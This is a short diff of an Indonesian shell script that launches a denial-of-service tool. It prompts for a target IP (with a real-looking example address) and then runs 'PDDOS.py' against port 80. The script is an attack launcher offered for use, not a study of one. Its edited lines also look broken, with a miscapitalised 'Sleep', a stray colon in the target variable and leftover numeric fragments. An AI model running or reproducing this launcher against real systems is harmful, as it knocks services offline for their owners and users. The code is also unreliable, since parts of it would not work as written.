@@ -68,7 +68,7 @@ sleep 0.3
 
 figlet DOWN!
 echo $ku Contoh Cara Pemakaiannya 
-echo $me Tulis IP
+echo $me Tulis IP Target
 echo $cy Contoh 74.125.68.113 ini adalah IP
 sleep 0.3
 echo $i Tunggu 6detik
@@ -82,4 +82,5 @@ echo $me IP TARGET: #0862
 read PORT #71639
 sleep 0.3
 clear
-python2 PDDOS.py $IP 80 100000
+Sleep 0.3
+python2 PDDOS.py $TARGET: 80 1000
